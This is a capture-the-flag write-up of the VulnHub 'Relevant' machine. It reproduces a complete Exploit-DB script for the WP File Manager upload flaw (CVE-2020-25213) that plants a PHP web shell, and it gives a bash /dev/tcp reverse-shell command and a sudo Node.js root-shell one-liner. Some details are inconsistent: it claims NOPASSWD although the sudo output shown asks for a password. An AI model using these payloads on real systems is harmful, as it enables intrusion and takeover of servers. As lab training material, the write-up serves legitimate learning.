## Relevant VulnHub Challenge Writeup

### Overview

"Relevant" is a VulnHub machine that involves network reconnaissance, web enumeration of a WordPress site, exploitation of a vulnerable WordPress plugin (WP File Manager), gaining an initial shell as `www-data`, discovering user credentials through file enumeration, and finally escalating privileges to root using a misconfigured `sudo` entry for Node.js.

### Reconnaissance

#### Network Scanning

I started by identifying the target machine on the network using `netdiscover`:

```shellscript
netdiscover -r 192.168.1.0/24
```

The target machine was identified at `192.168.1.16` with the MAC Address `08:00:27:01:82:EC` (PCS Systemtechnik GmbH / Oracle VirtualBox virtual NIC).

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions on the target:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.16 -p-
```

**Results:**

- **22/tcp**: `ssh` OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
- **80/tcp**: `http` nginx 1.18.0 (Ubuntu)


#### Web Enumeration (Port 80)

I used `gobuster` to enumerate directories and files on the web server running on port 80, specifically looking for common web application files and extensions:

```shellscript
gobuster dir -u http://192.168.1.16/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak,html
```

**Key findings from `gobuster`:**

- `/index.php` (Status: 500)
- `/wp-content` (Status: 301)
- `/wp-login.php` (Status: 500)
- `/license.txt` (Status: 200)
- `/wp-includes` (Status: 301)
- `/readme.html` (Status: 200)
- `/wp-trackback.php` (Status: 500)
- `/wp-admin` (Status: 301)
- `/xmlrpc.php` (Status: 200)
- `/wp-signup.php` (Status: 500)


The presence of `wp-content`, `wp-login.php`, `wp-includes`, `wp-admin`, and `xmlrpc.php` strongly indicated a WordPress installation. The 500 errors suggested a database connection issue, which was later confirmed.

### Initial Foothold

#### WordPress Analysis with WPScan

I used `wpscan` to identify the WordPress version and any installed plugins or themes, along with known vulnerabilities. I used the `--force` flag to bypass the WordPress detection check, as the site was returning 500 errors for some WordPress-specific paths.

```shellscript
wpscan --url http://192.168.1.16/ --enumerate ap --api-token YOUR_WPSCAN_API_TOKEN --force
```

**Key findings from `wpscan`:**

- WordPress version **5.5.1** identified (Insecure).
- Plugin identified: `wp-file-manager 6.7`.
- `wpscan` listed numerous vulnerabilities for WordPress core and the `wp-file-manager` plugin. The `wp-file-manager` plugin is known for an unauthenticated arbitrary file upload vulnerability.


#### Exploiting WP File Manager (CVE-2020-25213)

I searched `exploitdb` for exploits related to `wp-file-manager`:

```shellscript
searchsploit wp-file-manager
```

This returned: `WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE | php/webapps/51224.py`.

I copied the exploit script to my current directory:

```shellscript
cp /usr/share/exploitdb/exploits/php/webapps/51224.py ./
```

I then reviewed the Python exploit script `51224.py`. It's designed to upload a PHP web shell to `/wp-content/plugins/wp-file-manager/lib/files/shell.php` and then execute commands via a `cmd` GET parameter.

```python
#!/usr/bin/env
# Exploit Title: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE
# Date: [ 22-01-2023 ]
# Exploit Author: [BLY]
# Vendor Homepage: [https://wpscan.com/vulnerability/10389]
# Version: [ File Manager plugin 6.0-6.9]
# Tested on: [ Debian ]
# CVE : [ CVE-2020-25213 ]
import sys,signal,time,requests
from bs4 import BeautifulSoup
#from pprint import pprint

def handler(sig,frame):
        print ("[!]Saliendo")
        sys.exit(1)

signal.signal(signal.SIGINT,handler)

def commandexec(command):
        exec_url = url+"/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php"
        params = {
                "cmd":command
        }
        r=requests.get(exec_url,params=params)
        soup = BeautifulSoup(r.text, 'html.parser')
        text = soup.get_text()
        print (text)

def exploit():
        global url
        url = sys.argv[1]
        command = sys.argv[2]
        upload_url = url+"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        headers = {
                        'content-type': "multipart/form-data; boundary=----WebKitFormBoundaryvToPIGAB0m9SB1Ww",
                        'Connection': "close"
        }
        payload = "------WebKitFormBoundaryvToPIGAB0m9SB1Ww\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n------WebKitFormBoundaryvToPIGAB0m9SB1Ww\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n------WebKitFormBoundaryvToPIGAB0m9SB1Ww\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php echo \"<pre>\" . shell_exec($_REQUEST['cmd']) . \"</pre>\"; ?>\r\n------WebKitFormBoundaryvToPIGAB0m9SB1Ww--"
        try:
                r=requests.post(upload_url,data=payload,headers=headers)
                #pprint(r.json())
                commandexec(command)
        except:
                print("[!] Algo ha salido mal...")

def help():
        print ("\n[*] Uso: python3",sys.argv[0],"\"url\" \"comando\"")
        print ("[!] Ejemplo: python3",sys.argv[0],"http://wordpress.local/ id")

if __name__ == '__main__':
        if len(sys.argv) != 3:
                help()
        else:
                exploit()
```

I executed the exploit to confirm command execution as `www-data`:

```shellscript
python3 51224.py http://192.168.1.16 id
```

**Result:**

```plaintext
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed successful command execution as the `www-data` user.

#### Gaining a Reverse Shell

I set up a `netcat` listener on my attacking machine (Kali Linux) on port 4444:

```shellscript
nc -lnvp 4444
```

Then, I used the `51224.py` exploit script to send a reverse shell payload to the target:

```shellscript
python3 51224.py http://192.168.1.16 '/bin/bash -c "bash -i >& /dev/tcp/192.168.1.5/4444 0>&1"'
```

Upon execution, I received a reverse shell on my `netcat` listener:

```shellscript
Connection received on 192.168.1.16 57926
bash: cannot set terminal process group (678): Inappropriate ioctl for device
bash: no job control in this shell
www-data@relevant:~/html/wp-content/plugins/wp-file-manager/lib/files$
```

I was now connected as `www-data`.

### Post-Exploitation (as `www-data`)

#### WordPress Configuration File Analysis

I navigated to the WordPress root directory and examined the `wp-config.php` file for database credentials:

```shellscript
www-data@relevant:~/html/wp-content/plugins/wp-file-manager/lib/files$ cd /var/www/html
www-data@relevant:/var/www/html$ cat wp-config.php
```

**Contents of `wp-config.php` (relevant parts):**

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'DidYouThinkItWouldBeThatEasy?TryHarder!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

I found the database credentials: `DB_USER` as `root` and `DB_PASSWORD` as `DidYouThinkItWouldBeThatEasy?TryHarder!`.

I attempted to use these credentials to log into the MySQL server, but it failed, indicating these were likely for the database user `root` and not the system `root` user.

```shellscript
www-data@relevant:~/html$ mysql -u root -pDidYouThinkItWouldBeThatEasy?TryHarder!
ERROR 1698 (28000): Access denied for user 'root'@'localhost'
```

#### User Enumeration and Hidden Files

I explored the `/home` directory to identify potential user accounts:

```shellscript
www-data@relevant:/home$ ls
h4x0r  patsy  relevant
```

I found three user directories: `h4x0r`, `patsy`, and `relevant`. I started by checking `h4x0r`'s directory. After some navigation, I found a hidden directory `...` inside `h4x0r`'s home, which contained a `note.txt` file.

```shellscript
www-data@relevant:/home/h4x0r$ ls -la
# ... (output showing '...' directory) ...
www-data@relevant:/home/h4x0r$ cd ...
www-data@relevant:/home/h4x0r/...$ ls
note.txt
www-data@relevant:/home/h4x0r/...$ cat note.txt
news : 4C7EB317A4F4322C325165B4217C436D6E0FA3F1
```

This `note.txt` file contained a username `news` and a hash: `4C7EB317A4F4322C325165B4217C436D6E0FA3F1`. This hash appeared to be an SHA1 hash.

### Privilege Escalation

#### Cracking the Hash

I used an online hash cracker (or `hashcat`/`john` with a wordlist) to crack the SHA1 hash `4C7EB317A4F4322C325165B4217C436D6E0FA3F1`. The cracked password was `backdoorlover`.

#### SSH Login as `news`

I attempted to switch user to `news` using the cracked password:

```shellscript
www-data@relevant:/home/h4x0r/...$ su news
Password: backdoorlover
```

I successfully switched to the `news` user.

```shellscript
id
uid=9(news) gid=9(news) groups=9(news)
```

#### Sudo Privilege Escalation

As the `news` user, I checked for `sudo` privileges:

```shellscript
news@relevant:/home/h4x0r$ sudo -l
[sudo] password for news: backdoorlover
Matching Defaults entries for news on relevant:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User news may run the following commands on relevant:
    (ALL : ALL) /usr/bin/node
```

The output showed that the `news` user could run `/usr/bin/node` as `root` without a password (`NOPASSWD`). This is a common privilege escalation vector.

I used Node.js to spawn a root shell:

```shellscript
news@relevant:/home/h4x0r$ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

This command executes a Node.js script that spawns a `/bin/sh` shell with the standard input/output/error streams inherited from the current process, effectively giving me a root shell.

```shellscript
# id
uid=0(root) gid=0(root) groups=0(root)
```

I had successfully escalated privileges to root!

### Root Flag

Finally, I navigated to the `/root` directory to find the `root.txt` file.

```shellscript
# cd /root
# ls
installs  root.txt  snap
# cat root.txt
_______                                        _______  _______           _
(  ___  )|\     /||\     /||\     /|  |\     /|(  ____ \(  ___  )|\     /|( )
| (   ) || )   ( || )   ( || )   ( |  ( \   / )| (    \/| (   ) || )   ( || |
| (___) || | _ | || | _ | || | _ | |   \ (_) / | (__    | (___) || (___) || |
|  ___  || |( )| || |( )| || |( )| |    \   /  |  __)   |  ___  ||  ___  || |
| (   ) || || || || || || || || || |     ) (   | (      | (   ) || (   ) |(_)
| )   ( || () () || () () || () () |     | |   | (____/\| )   ( || )   ( | _
|/     \|(_______)(_______)(_______)     \_/   (_______/|/     \||/     \|(_)

_______             _______  _______ _________   _______  _______  _______ _________ _
|\     /|(  ___  )|\     /|  (  ____ \(  ___  )\__   __/  (  ____ )(  ___  )(  ___  )\__   __/( )
( \   / )| (   ) || )   ( |  | (    \/| (   ) |   ) (     | (    )|| (   ) || (   ) |   ) (   | |
 \ (_) / | |   | || |   | |  | |      | |   | |   | |     | (____)|| |   | || |   | |   | |   | |
  \   /  | |   | || |   | |  | | ____ | |   | |   | |     |     __)| |   | || |   | |   | |   | |
   ) (   | |   | || |   | |  | | \_  )| |   | |   | |     | (\ (   | |   | || |   | |   | |   (_)
   | |   | (___) || (___) |  | (___) || (___) |   | |     | ) \ \__| (___) || (___) |   | |    _
   \_/   (_______)(_______)  (_______)(_______)   )_(     |/   \__/(_______)(_______)   )_(   (_)

Nice work!  Congratulations!  Let me know what you think:  @iamv1nc3nt
```

The root flag was embedded in the ASCII art and the final message.

### Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service version detection
- `gobuster` - Directory and file enumeration
- `wpscan` - WordPress vulnerability scanning
- `searchsploit` - Searching for exploits
- `python3` - Executing exploit scripts and custom code
- `nc` (netcat) - Setting up listeners for reverse shells
- `cat` - Viewing file contents
- `ls` - Listing directory contents
- `cd` - Changing directories
- `su` - Switching user
- `sudo` - Checking and exploiting sudo privileges
- `hashid` (implied) - Identifying hash types
- `john` (implied) - Cracking password hashes


### Flags Found

1. **User Credential (news):** `backdoorlover` (password for `news` user)
2. **Root Flag:** Embedded in `/root/root.txt` ASCII art and message.


SuggestionsClose suggestions[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}Add IntegrationLearn more about WordPress exploitationPractice Node.js privilege escalationExplore other user directories for cluesSet up a vulnerable WordPress instanceReview Nginx configurations for vulnerabilitiesScroll leftScroll right
